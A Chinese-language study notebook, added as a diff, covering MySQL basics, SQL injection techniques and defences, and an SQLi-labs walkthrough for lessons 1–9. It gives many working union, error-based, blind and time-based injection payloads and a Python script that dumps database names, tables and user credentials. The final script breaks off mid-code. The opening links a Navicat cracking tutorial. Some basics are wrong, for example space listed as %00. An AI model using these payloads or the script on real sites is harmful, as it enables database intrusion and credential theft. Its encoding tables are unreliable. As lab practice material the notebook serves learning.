@@ -1,0 +1,997 @@
+# 数据库基础
+先说一下环境和用的工具吧
+
+环境我就在本机win10+phpstudy，也就是mysql，就不麻烦再去开虚拟机了
+
+因为在学校学过mssql，所以这里选择mysql
+
+工具是navicat，这里给大家一个破解navicat的教程，里面也有exe可以下载，注册机破解挺简单的
+
+https://www.jianshu.com/p/5f693b4c9468
+
+然后因为redis和mongodb听得挺多的，以前也没有花时间去了解，正好趁这个星期把基础学一学这两个二选一吧，有多的时间再去了解另一个，这两个非关系型的笔记就不放在这里了，后续可能会放在博客上
+
+https://www.gsuhy.cn/
+
+也欢迎大家来交换友链(逃
+
+## 关系型数据库和非关系型数据库区别
+
+
+
+- 关系型数据库是依据关系模型来创建的数据库。
+- 所谓关系模型就是“一对一、一对多、多对多”等关系模型，关系模型就是指二维表格模型,因而一个关系型数据库就是由二维表及其之间的联系组成的一个数据组织。
+- 关系型数据可以很好地存储一些关系模型的数据，一对一，一对多，多对多
+- 关系模型包括数据结构（数据存储的问题，二维表）、操作指令集合（SQL语句）、完整性约束(表内数据约束、表与表之间的约束)。
+
+非关系型，主要有几种类型
+
+- 列模型：存储的数据是一列列的。关系型数据库以一行作为一个记录，列模型数据库以一列为一个记录。（这种模型，数据即索引，IO很快，主要是一些分布式数据库）----Hbase
+- 键值对模型：存储的数据是一个个“键值对”----redis
+- 文档类模型：以一个个文档来存储数据----mongodb
+
+## 数据库分类
+
+**关系型数据库：**
+
+Oracle、DB2、Microsoft SQL Server、Microsoft Access、MySQL
+
+**非关系型数据库：**
+
+NoSql、Cloudant、MongoDb、redis、HBase
+
+
+### 常用数据类型
+
+| 类型    | 大小      | 说明           |
+| ------- | --------- | -------------- |
+| CHAR    | 0-255字节 | 字符串         |
+| VARCHAR | >255字节  | 大一点的字符串 |
+| INT     | 4字节     | 整型           |
+| FLOAT   | 4字节     | 单精度         |
+
+### 基本操作
+
+基本操作包括创建、删除数据库，创建、删除表，增删查改数据等
+
+#### 创建/删除数据库并插入数据
+
+`CREATE DATABASE test;`
+
+`drop database test`
+
+![1564977083393](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564977083393.png)
+
+#### 创建/删除表
+
+``` sql
+create table tb(
+	id int,
+	name varchar(40),
+	age int,
+	grd int,
+	PRIMARY KEY (id)
+);
+insert into tb(id,name,age,grd) VALUES (111,'Gsuhy',20,100);
+insert into tb(id,name,age,grd) VALUES (222,'abc',10,99);
+insert into tb(id,name,age,grd) VALUES (333,'qwe',40,98);
+```
+
+![1564984420636](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564984420636.png)
+
+删除表的话就可以用drop语句`DROP TABLE table_name ;`
+
+#### 数据操作(查询、更新等)
+
+- 首先最简单的`select * from tb` ，也就是返回tb表中的所有数据
+
+- 有条件的语句，那么就是带上**where**，比如我上面的表中要查询id为111的所有数据那么语句就应该为`select * from tb where id=111;`
+
+![1564984493285](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564984493285.png)
+
+- 还有如果要选择特定的列来返回结果那么就可以构造`select id,grd from tb ;`
+
+![1564984638569](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564984638569.png)
+
+- 或者再精确一点的查询`select id,grd from tb where id =111;`
+
+![1564984708130](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564984708130.png)
+
+- 那么有时候会遇到一个表中的一个列，会有重复的值，那么这个时候就可以用到**select distinct**语句，返回的就是列中不同的值`SELECT DISTINCT id FROM tb;`
+- 同时有时候会查询返回多个条件或者某一个条件的数据，这个时候可以用**and**和**or**   `select * from tb where age>18 and grd>97;`![1564985090976](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564985090976.png)
+- **order by**：对结果集按照一个列或者多个列进行排序，ASC升序，DESC降序默认是升序`select * from tb order by grd;`
+
+![1564985361774](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564985361774.png)
+
+- **update**:`UPDATE *table_name*
+  SET column1=value1,column2=value2,...
+  WHERE some_column=some_value;`
+
+关于update有这么两点我觉得需要注意的地方
+
+1.首先update更新的要是已经存在的数据
+
+2.如果update后面不带where语句的话，那么表中所有的数据都会被更新
+
+- **delete**：用于删除表中的行，`DELETE FROM *table_name*
+  WHERE *some_column*=*some_value*;`删除所有数据
+
+  您可以在不删除表的情况下，删除表中所有的行。这意味着表结构、属性、索引将保持不变：
+
+  `DELETE FROM table_name;`或`DELETE * FROM table_name;`
+
+- **limit**：从表中选取头n条记录，也是sql注入中经常用到的
+
+`select * from tb limit 2;`![1564986796272](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564986796272.png)
+
+- **like**:也就是可以理解为像，比如查询表中的字母G开头的所有数据`select * from tb where name like'G%';`，这里为什么会有%号呢，是因为%是通配符，详情请参考https://www.runoob.com/sql/sql-wildcards.html
+- **IN**：in操作允许在where字句中规定多个值`select * from tb where name in('Gsuhy','qwe');`
+
+![1564987170985](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564987170985.png)
+
+- **JOIN**:用于把来自两个或多个表的行结合起来。
+
+我这里又建了一张名叫ta的表，用于简单的join操作
+
+![1564988797238](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564988797238.png)
+
+然后这里我用join语句来返回满足条件id相同的结果
+
+`select tb.id,tb.name,ta.id,ta.birth from tb inner join ta on tb.id=ta.id;`![1564988777253](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564988777253.png)
+
+join有4种类型：
+
+**INNER JOIN**：如果表中有至少一个匹配，则返回行
+
+**LEFT JOIN**：即使右表中没有匹配，也从左表返回所有的行
+
+**RIGHT JOIN**：即使左表中没有匹配，也从右表返回所有的行
+
+**FULL JOIN**：只要其中一个表中存在匹配，则返回行
+
+- **UNION**：合并两个或多个 SELECT 语句的结果。![1564990373516](C:\Users\10200\AppData\Roaming\Typora\typora-user-images\1564990373516.png)
+
+- **ALTER**:当我们需要修改数据表名或者修改数据表字段时
+
+- **SELECT INTO** 语句从一个表中选取数据，然后把数据插入另一个表SELECT INTO 语句常用于创建表的备份复件或者用于对记录进行存档。
+
+  　　语法：
+
+    　　把所有的列插入新表：
+
+  ```
+  SELECT * INTO new_table_name [IN externaldatabase]  FROM old_tablename
+  ```
+
+  　　只把希望的列插入新表：
+
+  ```
+  SELECT column_name(s) INTO new_table_name [IN externaldatabase] FROM old_tablename
+  ```
+
+# SQL注入基础
+
+## 0x01 基本的url编码：
+- 空格=%00
+- 单引号=%27
+- `#` =%23
+- 双引号=%2
+## 0x02概念
+sql注入就是把通过sql命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器并且执行恶意的sql命令的目的。也就是利用现有的应用程序，将恶意的sql命令注入到后台的数据库中并执行，可以通过在web表单中输入恶意的sql语句得到有一个存在安全漏洞的网站上的数据库信息。(将sql代码插入或添加到用户输入的参数中，再将这些参数传递到后台的sql服务器加以解析并执行)
+##  0x03报错模式
+- 显错模式
+- 盲注
+## 0x04寻找注入点-试探方法
+- 单引号、1=1/1=2测试
+- 利用数据库系统函数进行测试
+
+```
+http://host/showdetail.asp?id=49  and 1=convert(int,(@@version))
+
+http://host/showdetail.asp?id=49  and 1=convert(int,(select host_name()))
+
+http://host/showdetail.asp?id=49  and 1=convert(int,(user))
+```
+
+### UNION
+`select * from article where id="" union select * from user where userid=1`
+
+| 第一个select返回结果         |    title | content  |
+| :--------------------------- | -------: | :------: |
+| 第二个select执行后返回的结果 | username | password |
+也就是原来应该显示title和content的地方，分别显示为username何password
+##### 注入步骤
+- 注入点所查询表的字段数
+  `order by 1`
+- 判断回显
+  `and 1=2 union select 1,2,3,4 from admin`
+- 猜字段名
+  `and 1=2 union select admin,2,password,4 from admin`
+- 爆数据库名
+  `and 1=2 union select 1,user(), 3,database()
+- 报表
+  `and 1=2 union select 1, TABLE_NAME,3,4 from information_schema.TABLES where TABLE_SCHEMA = 0x70687074657374 (数据库的16进制编码) limit 0,1`
+- 爆字段
+  `and 1=2 union select 1, COLUMN_NAME,3,4 from information_schema.COLUMNS where TABLE_NAME=表的16进制编码 limit 0,1`
+- 最后就是爆数据啦
+  `and 1=2 union select 1, name,3,password from web.ad_user limit 0,1`
+### 四种报错注入方式
+原理：当在函数比如count后面使用分组语句就会把查询的一部分以错误的形式显示
+- floor报错
+- extractvalue
+- updatexml
+
+### 宽字节注入
+在PHP连接Mysql的时候，设置`set character_set_client=gbk`的时候就会导致宽字节注入这个漏洞 ，注入参数里带入`%df%27`，也就是把`\`给过滤。举个栗子`/index.php?id=1`这个有宽字节注入漏洞的话，提交`/index.php?id=-1' and 1=1%23`那mysql后台运行的语句应该是`select * from user where id='1\' and 1=1#'`，很明显我们提交的单引号被转义导致前面的单引号就没有闭合,如果提交的语句为`/index.php?id=-1%df' and 1=1%23`时，mysql运行的sql语句为`select * from user where id='1運' and 1=1#'`
+这是因为单引号被自动转义成了`\'`，前面的`%df`和转义字符`\`组合成了`%df%5c`，也就是運字，这时候单引号还在的，就成功闭合了前面的单引号。原因是因为php在链接mysql时候设置了`set character_set_slient=gbk`,告诉客户端来源数据编码是GBK，然后mysql服务器对查询语句进行GBK转码导致`\`被吃掉。
+####  解决办法
+- 在执行查询之前先执行`SET NAMES 'gbk',character_set_client=binary`.
+- 使用`mysql_set_charset('gbk')`设置编码，然后用`mysql_real_escape_string()`函数过滤。
+- 使用pdo方法，在php5.3.6及以下的版本设置`setAttribute(PDO::ATTR_EMULATE_PREPARES，false);`来禁用`preparede statements`的仿真效果。
+###  二次urldecode注入
+在字符被转换的时候是比较容易产生漏洞的，有些代码中使用了`urlcoede`或者`rawurldecode`函数就会导致二次编码，还记得上次班级对抗赛就有一道web题就有二次编码问题，但是由于当时太菜不知道这个东西，脑洞也没那么大，所以编码一次以后都不知道该怎么办。。。。。看书真的有用
+### 漏洞防范
+#### 有一个叫做魔术引号的东西`magic_quotes_gpc、magic_quotes_runtime`
+顺便先说一下数据污染，一般数据污染有两种方法
+- 被动接受参数，就像GET,POST
+- 主动获取参数，类似于读取远程页面或者文件内容。
+  `magic_quotes_gpc`就是可以对GET,POST,COOKIED的值给过滤，`magic_quotes_runtime`是对从数据库或者文件汇总获取的数据进行过滤。一般PHP中开启了这两个可以防止一些sql的注入漏洞。包括(')、(")、(\)、和NULL。对于int注入就没有什么用。
+#### addslashes
+一个简单检查参数的函数，过滤的东西跟`magic_quotes_gpc`是一样的，程序先判断有没有开GPC，如果没开就过滤那些参数，不过参数必须是string型的。
+举个栗子
+
+```
+<?php
+$str="abc'";
+echo?addslashes($str);
+?>
+------
+输出的是：abc\'
+```
+
+#### mysql_real_escape_string or mysql_escape_string
+两个都是对字符串进行过滤，唯一不一样的地方在于`mysql_real_escape_string`接受的是一个连接句柄并根据当前字符集转义字符串，比如
+
+```
+<?php
+$con=mysql_connect("localhost","root","123456");
+$id=mysql_real_escape_string($_GET['id'],$con);
+$sql="select * from test where id='".id."'";
+echo $sql;
+---------------
+当`?id=1'`时，输出则为：select * from test where id ='1\"
+```
+
+#### intval等字符转换
+前面有提到过，转换字符什么什么的，基本上就会有漏洞产生，而且也说到`magic_quotes_gpc`对于int型的注入没什么用，所以就有这里的intval了，也就是说intval函数是将变量转换为int型。、
+
+### PDO prepare 预编译
+#### 啥是PDO
+PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。实现 PDO 接口的每个数据库驱动可以公开具体数据库的特性作为标准扩展功能。 注意利用 PDO 扩展自身并不能实现任何数据库功能；必须使用一个 具体数据库的 PDO 驱动 来访问数据库服务。
+PDO 提供了一个 数据访问 抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。 PDO 不提供 数据库 抽象层；它不会重写 SQL，也不会模拟缺失的特性。如果需要的话，应该使用一个成熟的抽象层。**而PDO prepare是通过预编译的方式来处理数据库查询**。
+#### PDO->query()
+`PDO->query()` 用于查询数据记录并返回查询结果。
+语法：
+
+`PDO->query( string statement )`
+
+例子：
+
+```
+<?php
+//构造PDO连接
+$dbh = "mysql:host=localhost;dbname=test";
+$db = new PDO($dbh, 'root', 'root123');
+$db->query("set character set 'gbk'");
+
+//查询数据
+$sql = "SELECT * FROM user";
+$sth = $db->query($sql);
+while($row = $sth->fetch()){
+    echo "用户名:".$row['username']."<br />";
+    echo "电子邮件:".$row['email']."<br />";
+    echo "注册日期:".date("Y-m-d", $row['regdate'])."<br /><br />";
+}
+$db = null;
+?>
+```
+
+在上面的例子中，是通过仿照 MySQL 的查询例子，用 PDO 的方式对 user 表进行查询操作。
+
+#### PDOStatement->fetch()
+
+
+PDO 中的 `fetch() `方法用于从结果集中获取一行结果，该方法行为类似 `mysql_fetch_array() `，不同的是该方法不仅返回数组，还可返回对象。
+
+语法：
+`PDOStatement->fetch(int mode)`
+mode 为可选参数，表示希望返回的结果集类型，默认为关联及数字索引共有的数组形式。
+mode参数可以取很多值。
+- PDO::FETCH_ASSOC	关联索引（字段名）数组形式
+- PDO::FETCH_NUM	数字索引数组形式
+- PDO::FETCH_BOTH	默认，关联及数字索引数组形式都有
+- PDO::FETCH_OBJ	按照对象的形式
+- PDO::FETCH_BOUND	通过 bindColumn() 方法将列的值赋到变量上
+- PDO::FETCH_CLASS	以类的形式返回结果集，如果指定的类属性不存在，会自动创建
+- PDO::FETCH_INTO	将数据合并入一个存在的类中进行返回
+- PDO::FETCH_LAZY	 结合了 PDO::FETCH_BOTH、 PDO::FETCH_OBJ，在它们被调用时创建对象变量
+
+#### PDOStatement->setFetchMode()
+
+如果不在 fetch() 中指定返回的结果类型，也可以单独使用 setFetchMode() 方法设定，如：
+
+```
+......
+$sth = $db->query($sql);
+$sth->setFetchMode(PDO::FETCH_ASSOC);
+while($row = $result->fetch()){
+    ......
+}
+```
+
+#### PDOStatement->fetchAll()
+
+
+`fetchAll()` 方法用于把数据从数据集一次性取出并放入数组中。
+
+
+语法：
+
+`PDOStatement->fetchAll([int mode [,int column_index]])`
+
+
+mode 为可选参数，表示希望返回的数组，column_index 表示列索引序号，当 mode 取值 `PDO::FETCH_COLUMN `时指定。mode参数可以取这些值
+- PDO::FETCH_COLUMN	指定返回返回结果集中的某一列，具体列索引由 column_index 参数指定
+- PDO::FETCH_UNIQUE	以首个键值下表，后面数字下表的形式返回结果集
+- PDO::FETCH_GROUP	按指定列的值分组
+
+例子
+
+```
+$sth = $db->query($sql);
+$row = $sth->fetchAll();
+
+//只返回 username（index=1）
+$row = $sth->fetchAll(PDO::FETCH_COLUMN, 1);
+
+//将 username GROUP 返回（注：由于表中 username 无重复记录，因此本例无意义）
+$row = $sth->fetchAll(PDO::FETCH_COLUMN|PDO::FETCH_GROUP, 1);
+
+```
+未完....还有很多很多
+
+## SQLi-labs训练(less1-10)
+
+欢迎各位师傅指证不对的地方，less1-less10是以前写的，less11-less20是最近写的。
+
+### less1(GET- Error based- Single quotes - String)
+**基于错误的GET单引号字符型注入**- `http://127.0.0.1/sqli-labs-master/Less-1/?id=1`
+- `http://127.0.0.1/sqli-labs-master/Less-1/?id=2`
+- `http://127.0.0.1/sqli-labs-master/Less-1/?id=1 and 1=1/2`
+  都是正常
+  `http://127.0.0.1/sqli-labs-master/Less-1/?id=1'`
+  结果就报错，分析一下：
+  `'     '   1'   ' LIMIT 0,1       '`
+  最外面的两个单引号是标识错误，1'是输入的，那么1两边的单引号那么应该就是sql语句
+  那么实际在后台的语句应该是
+  `select username,password from table where id='input'`
+#####  接下来猜字段：
+`http://127.0.0.1/sqli-labs-master/Less-1/?id=1‘ order by 4%23'`
+##### -union查询：
+`http://127.0.0.1/sqli-labs-master/Less-1/?id=1' union select 1,2,3%23`这里都是正常的？？？
+看下源码，其中发现`mysql_fetch_array`只被调用了一次，而`mysql_fetch_array`从结果集中取得一行作为关联数字或者数字数组或两个一起，所以这里无论怎么搞都只会出来第一行的查询结果，那么只要让第一行查询结果为空就行
+- `http://127.0.0.1/sqli-labs-master/Less-1/?id=0‘ union select 1,2,3%23'`，可以看到第二列和第三列的结果显示在页面上了，不过我这里和教程上面有些不同，并没有提示`your sql.........`，不知道为什么。
+##### 接下里就是爆数据库：
+`http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,database(),3%23 `--得到security
+##### 在CSDN上看到还有一种方法爆出了所有的数据库
+`http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(SCHEMA_NAME),3
+from information_schema.SCHEMATA%23`,不过目前好像只适合less1.。。。。。
+##### 爆表
+`http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(TABLE_NAME),3 from information_schema.TABLES where TABLE_SCHEMA='security'%23`
+##### 爆字段名
+`http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(COLUMN_NAME),3 from information_schema.COLUMNS where TABLE_NAME = 'users' and TABLE_SCHEMA = 'Security'%23`
+如果这里要精确得查找表的字段名，那么就要加上限定条件`TABLE_NAME='user'/TABLE_SCHEMA='Security'`
+##### 爆字段内容
+`http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username),group_concat(password) from users %23`
+### less2(GET-Error based -Intiger based)
+**基于错误的GET整型注入**
+同样用`and 1=1`和`and 1=2`进行测试，结果`and 1=2`报错了，其实就是跟Less1是一样的，只不过不用闭合单引号。
+##### payload:
+`http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,2,concat_ws(char(32,58,32),id,database(),password) from  users limit 0,1 %23  `
+### less3(GET - Error based - Single quotes with twist string)
+**基于错误的GET单引号变形字符型注入**
+还是一样加个单引号先测一下`?id=1'`报错，分析一下报错语句
+`'     '   1'   ') LIMIT 0,1     ' at line 1 `多了一个），就想到应该是有一个（在起作用，那就需要把（闭合应该就行了
+`?id=1') and ('1' = '1`/`?id=1') and 1=1 --+`，闭合或者注释之后看到就正常了。
+看一下源码就是这样的`$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`
+
+##### payload
+`http://127.0.0.1/sqli-labs-master/Less-3/?id=-1%27) union select 1,2,concat_ws(char(32,58,32),id,username,password) from  users limit 6,1 --+  `
+### less4(GET – Error based – Double Quotes – String)
+**基于GET双引号字符型注入**
+PHP中双引号可以包含单引号，所以先直接`?id=1'`，没有报错，1=1和1=2都没有报错，`?id=1"`报错：`'"1"") LIMIT 0,1'`，发现居然还有个括号，我构造了一下`?id=1") and 1=1 --+`正常，但是1=2就报错
+
+-  `http://127.0.0.1/sqli-labs-master/Less-4/?id=-1") union select 1,table_name,3 from information_schema.tables where table_schema='security' --+`就爆出了第一个表emails
+  要爆出其他表就加个`limit *,1`即可
+##### payload
+- `http://127.0.0.1/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+`
+- `http://127.0.0.1/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+`
+- `http://127.0.0.1/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(username,password),3 from users --+`
+### less5(GET – Double Injection – Single Quotes – String)
+**双注入GET单引号字符型注入**
+#### 基于错误的sql语句构造
+##### 几个比较重要的函数
+- count():统计元组的个数
+- rand():产生一个0-1的随机数
+- floor():向下取整
+- group by:根据规则对结果进行分组
+  count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来
+##### payload:
+
+```
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1' union select count(*),1, concat('~',(select table_name from information_schema.tables where table_schema='security' limit 0,1),'~', floor(rand()*2)) as a from information_schema.tables group by a%23  
+
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1' union select count(*),1, concat('~',(select table_name from information_schema.tables where table_schema='security' limit 1,1),'~', floor(rand()*2)) as a from information_schema.tables group by a%23  
+
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1' union select count(*),1, concat('~',(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),'~', floor(rand()*2)) as a from information_schema.tables group by a%23  
+
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1' union select count(*),1, concat('~',(select email_id from emails limit 0,1),'~', floor(rand()*2)) as a from information_schema.tables group by a%23  
+
+Or
+
+http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1' and(select 1 from(select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))name from information_schema.tables group by name)a) --+
+
+http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database(),limit0,1),0x3a,0x3a,floor(rand()*2))name from information_schema.tables group by name)a) --+
+
+
+http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1' and (select 1 from (select count(*),concat(0x3a,0x3a,(select password from users limit 2,1),0x3a,0x3a,floor(rand()*2)) name from information_schema.tables group by name)b) --+
+```
+
+还有好多种方法
+##### 使用extractvalue:
+extractvalue(xml_frag,xpath_expr)
+extractvalue()接受两个字符串参数，一个xml标记xml_frag的片段和一个xpath表达式xpath_expr(也称为定位符)
+#####payload:
+
+```
+http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1' and 1=extractvalue(1,concat(0x5e24,(select user()))) --+
+```
+
+#####使用updatexml:updatexml(xml_target,xpath_expr,new_xml)
+此函数用新的xml片段new_xml替换xml标记xml_target的给定片段的单个部分，然后返回更改的xml。被替换的xml_target的部分与用户提供的xpath表达式xpath_expr匹配
+##### payload:
+
+```
+http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1' and 1=updatexml(1,concat(0x5e24,(select database())),1) --+
+```
+
+-name_const:name_const(name,value)
+用于生成结果时，name_const()会使列具有给定的名称
+payload:
+
+```
+http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1' and 1=(select * from (select name_const(version(),1),name_const(version(),1))b) --+
+```
+
+### less6(GET – Double Injection – Double Quotes – String)
+跟less5差不多，只是把单引号换成双引号就行
+### less7(GET – Dump into outfile – String)
+**导出文件GET字符型注入**
+先说几个函数
+##### outfile函数：
+`select...into outfile`语句可以将表的内容导出为一个文本文件
+` select * from users into outfile '路径';`
+#####  dumpfile:
+与outfile相似，只不过一次只导出一行
+`select * from users limit 0,1 into outfile '路径';`
+##### load_file:
+将数据导入mysql然后回到题目，先测试，测来测去，发现有`?id=1'`、`?id=1')`都是报错，但是`?id=1'))`是正常的
+##### 猜字段嘛
+`http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) order by 3 --+`
+##### 查询嘛
+`http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,2,3 --+`
+##### 权限测试
+`and (select count(*) from mysql.user)>0 --+`
+##### payload
+
+```
+http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,2,3 into outfile '路径、1.txt' --+‘
+```
+
+### less8(GET – Blind – Boolian Based – Single Quotes)
+**基于布尔盲注**
+#### 关键函数
+- length():返回字符串长度
+  `select length(database())`
+- substr():截取字符串
+  `select substr(database(),1,1)`
+- ascii():返回字符的ascii码
+  `select ascii(substr(database(),2,1))`
+
+```
+http://127.0.0.1/sqli-labs-master/Less-8/?id=1'
+```
+
+报错
+
+```
+http://127.0.0.1/sqli-labs-master/Less-8/?id=1' and 1=1--+
+
+http://127.0.0.1/sqli-labs-master/Less-8/?id=1' and (ascii(substr(database(),1,1)))>100 --+
+
+http://127.0.0.1/sqli-labs-master/Less-8/?id=1' and (ascii(substr(database(),1,1)))>115 --+
+
+http://127.0.0.1/sqli-labs-master/Less-8/?id=1' and (ascii(substr(database(),1,1)))<117 --+
+
+http://127.0.0.1/sqli-labs-master/Less-8/?id=1' and (ascii(substr(database(),1,1)))=115 --+
+```
+
+不过这样一个一个试也太慢了吧，不如来一个python脚本跑一蛤，这么厉害的脚本肯定不是来自目前的我，来自CSDN上一篇博客，并且这个脚本只有在2.7版本才能跑，在3.6就跑不了。
+
+```
+# -*-coding:utf-8-*-  
+
+import urllib  
+import urllib2  
+
+getTable = "users"  
+success_str = "You are in"  
+
+index = "0"  
+url = "http://127.0.0.1/sqli-labs-master/Less-8/?id=1"  
+database = "database()"  
+selectDB = "select database()"  
+selectTable = "select table_name from information_schema.tables where table_schema='%s' limit %d,1"  
+
+asciiPayload = "' and ascii(substr((%s),%d,1))>=%d #"  
+lengthPayload = "' and length(%s)>=%d #"  
+selectTableCountPayload = "'and (select count(table_name) from information_schema.tables where table_schema='%s')>=%d #"  
+
+selectTableNameLengthPayloadfront = "'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "  
+selectTableNameLengthPayloadbehind = ",1)>=%d #"  
+
+#发送请求,根据页面的返回的判断长度的猜测结果  
+#string:猜测的字符串;payload:使用的payload;length:猜测的长度  
+def getLengthResult(payload, string, length):  
+    finalUrl = url + urllib.quote(payload % (string, length))  
+    res = urllib2.urlopen(finalUrl)  
+    if success_str in res.read():  
+        return True  
+    else:  
+        return False  
+
+#发送请求,根据页面的返回的判断字符的猜测结果  
+#payload:使用的payload;string:猜测的字符串;pos:猜测字符串的位置;ascii:猜测的ascii  
+def getResult(payload, string, pos, ascii):  
+    finalUrl = url + urllib.quote(payload % (string, pos, ascii))  
+    res = urllib2.urlopen(finalUrl)  
+    if success_str in res.read():  
+        return True  
+    else:  
+        return False  
+
+#注入  
+def inject():  
+    #猜数据库长度  
+    lengthOfDBName = getLengthOfString(lengthPayload, database)  
+    print "length of DBname:" + str(lengthOfDBName)  
+    #猜数据库名称  
+    DBname = getName(asciiPayload, selectDB, lengthOfDBName)  
+    print "current database:" + DBname  
+    #猜数据库中的表的个数  
+    tableCount = getLengthOfString(selectTableCountPayload, DBname)  
+    print "count of talbe:" + str(tableCount)  
+    for i in xrange(0, tableCount):  
+        num = str(i)  
+        #猜当前表的长度  
+        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind  
+        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)  
+        print "current table length:" + str(tableNameLength)  
+        #猜当前表的名字  
+        selectTableName = selectTable % (DBname, i)  
+        tableName = getName(asciiPayload, selectTableName, tableNameLength)  
+        print tableName  
+    selectColumnCountPayload = "'and (select count(column_name) from information_schema.columns where table_schema='" + DBname + "' and table_name='%s')>=%d #"  
+    #猜指定表的列的数量  
+    columnCount = getLengthOfString(selectColumnCountPayload, getTable)  
+    print "table:" + getTable + " --count of column:" + str(columnCount)  
+    #猜该表有多少行数据  
+    dataCountPayload = "'and (select count(*) from %s)>=%d #"  
+    dataCount = getLengthOfString(dataCountPayload, getTable)  
+    print "table:" + getTable + " --count of data: " + str(dataCount)  
+    data = []  
+    #获取指定表中的列  
+    for i in xrange(0, columnCount):  
+        #猜列名长度  
+        selectColumnNameLengthPayload = "'and (select length(column_name) from information_schema.columns where table_schema='" + DBname + "' and table_name='%s' limit " + str(  
+            i) + ",1)>=%d #"  
+        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)  
+        print "current column length:" + str(columnNameLength)  
+        #猜列的名字  
+        selectColumn = "select column_name from information_schema.columns where table_schema='" + DBname + "' and table_name='%s' limit %d,1"  
+        selectColumnName = selectColumn % (getTable, i)  
+        columnName = getName(asciiPayload, selectColumnName, columnNameLength)  
+        print columnName  
+        tmpData = []  
+        tmpData.append(columnName)  
+        #获取该表的数据  
+        for j in xrange(0, dataCount):  
+            columnDataLengthPayload = "'and (select length(" + columnName + ") from %s limit " + str(j) + ",1)>=%d #"  
+            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)  
+            selectData = "select " + columnName + " from users limit " + str(j) + ",1"  
+            columnData = getName(asciiPayload, selectData, columnDataLength)  
+            tmpData.append(columnData)  
+        data.append(tmpData)  
+    #格式化输出数据  
+    tmp = ""  
+    for i in xrange(0, len(data)):  
+        tmp += data[i][0] + "   "  
+    print tmp  
+    for j in xrange(1, dataCount + 1):  
+        tmp = ""  
+        for i in xrange(0, len(data)):  
+            tmp += data[i][j] + "   "  
+        print tmp  
+
+#猜长度  
+def getLengthOfString(payload, string):  
+    lengthLeft = 0  
+    lengthRigth = 0  
+    guess = 10  
+    #确定长度上限,每次增加5  
+    while 1:  
+        if getLengthResult(payload, string, guess) == True:  
+            guess = guess + 5  
+        else:  
+            lengthRigth = guess  
+            break;  
+    #二分法查长度  
+    mid = (lengthLeft + lengthRigth) / 2  
+    while lengthLeft < lengthRigth - 1:  
+        if getLengthResult(payload, string, mid) == True:  
+            lengthLeft = mid  
+        else:  
+            lengthRigth = mid  
+        mid = (lengthLeft + lengthRigth) / 2  
+    return lengthLeft  
+
+#猜名字  
+def getName(payload, string, lengthOfString):  
+    #空格(32)是第一个可显示的字符delete(127)是最后一个可显示的字符  
+    tmp = ''  
+    for i in xrange(1, lengthOfString + 1):  
+        left = 32  
+        right = 127  
+        mid = (left + right) / 2  
+        while left < right - 1:  
+            if getResult(payload, string, i, mid) == True:  
+                left = mid  
+                mid = (left + right) / 2  
+            else:  
+                right = mid  
+            mid = (left + right) / 2  
+        tmp += chr(left)  
+    return tmp
+def main():
+      inject()
+main()
+```
+
+### less9(GET – Blind – Time based – Single Quotes)
+**基于时间-单引号-盲注**
+测试发现有没有单引号都是返回的`you are in......`，不管输入啥都是一样的
+管他的，脚本跑.......，脚本代码来自freebuf上一篇文章
+
+```
+#-*-coding:utf-8-*-
+
+import time
+import urllib
+import urllib2
+
+index = "0"
+getTable = "users"
+url = "http://127.0.0.1/sqli-labs-master/Less-8/?id=1"
+database = "database()"
+selectDB = "(select database())"
+selectTable = "(select table_name from information_schema.tables where table_schema='%s' limit %d,1)"
+asciiPayload = "' and if(ascii(substr(%s,%d,1))>=%d,0,sleep(0.1)) #"
+lengthPayload = "' and if(length(%s)>=%d,0,sleep(0.1)) #"
